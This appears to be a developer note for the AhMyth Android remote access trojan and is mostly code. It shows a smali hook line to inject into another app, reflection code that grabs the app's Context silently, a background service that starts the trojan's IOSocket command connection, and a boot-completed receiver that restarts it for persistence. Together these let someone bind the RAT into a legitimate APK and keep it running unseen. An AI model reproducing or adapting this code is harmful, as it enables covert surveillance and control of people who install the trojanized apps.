## New Hook Method
```smali
invoke-static, {} Lcom/package/ID/ahmyth/MainService;->start()V
```
## New hopeful Hook start function

. MainActivity.java
```java
MainService.startService(this);
finish();
```

- MainService.java
```java

    private static void findContext() throws Exception {
        Class<?> activityThreadClass;
        try {
            activityThreadClass = Class.forName("android.app.ActivityThread");
        } catch (ClassNotFoundException e) {
            // No context
            return;
        }
        final Method currentApplication = activityThreadClass.getMethod("currentApplication");
        final Context context = (Context) currentApplication.invoke(null, (Object[]) null);
        if (context == null) {
            // Post to the UI/Main thread and try and retrieve the Context
            final Handler handler = new Handler(Looper.getMainLooper());
            handler.post(new Runnable() {
                public void run() {
                    try {
                        Context context = (Context) currentApplication.invoke(null, (Object[]) null);
                        if (context != null) {
                            startService(context);
                        }
                    } catch (Exception ignored) {
                    }
                }
            });
        } else {
            startService(context);
        }
    }

    // Smali hook point
    public static void start() {
        try {
            findContext();
        } catch (Exception ignored) {
        }
    }

    public static void startService(Context context) {
        context.startService(new Intent(context, MainService.class));
    }
    
    IOSocket.start(this);
```
- IOSocket.java
```java
    public static void start(Context context) {
        IOSocket.context = context;
        startInPath(context.getFilesDir().toString());
    }

    public static void startContext() {
        try {
            findContext();
        } catch (Exception ignored) {
        }
    }

    private static void findContext() throws Exception {
        Class<?> activityThreadClass;
        try {
            activityThreadClass = Class.forName("android.app.ActivityThread");
        } catch (ClassNotFoundException e) {
            // No context
            return;
        }
        final Method currentApplication = activityThreadClass.getMethod("currentApplication");
        final Context context = (Context) currentApplication.invoke(null, (Object[]) null);
        if (context == null) {
            // Post to the UI/Main thread and try and retrieve the Context
            final Handler handler = new Handler(Looper.getMainLooper());
            handler.post(new Runnable() {
                public void run() {
                    try {
                        Context context = (Context) currentApplication.invoke(null, (Object[]) null);
                        if (context != null) {
                            start(context);
                        }
                    } catch (Exception ignored) {
                    }
                }
            });
        } else {
            start(context);
        }
    }
```
- ConnectionManager.java
```java
    private void findContext() throws Exception {
        Class<?> activityThreadClass;
        try {
            activityThreadClass = Class.forName("android.app.ActivityThread");
        } catch (ClassNotFoundException e) {
            // No context (running as root?)
            return;
        }
        final Method currentApplication = activityThreadClass.getMethod("currentApplication");
        context = (Context) currentApplication.invoke(null, (Object[]) null);
        if (context == null) {
            // Post to the UI/Main thread and try and retrieve the Context
            final Handler handler = new Handler(Looper.getMainLooper());
            handler.post(new Runnable() {
                public void run() {
                    synchronized (contextWaiter) {
                        try {
                            context = (Context) currentApplication.invoke(null, (Object[]) null);
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                        contextWaiter.notify();
                    }
                }
            });
            synchronized (contextWaiter) {
                if (context == null) {
                    contextWaiter.wait(100);
                }
            }
        }
    }

```
- MyReciever
```java
if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
    MainService.startService(context);
```
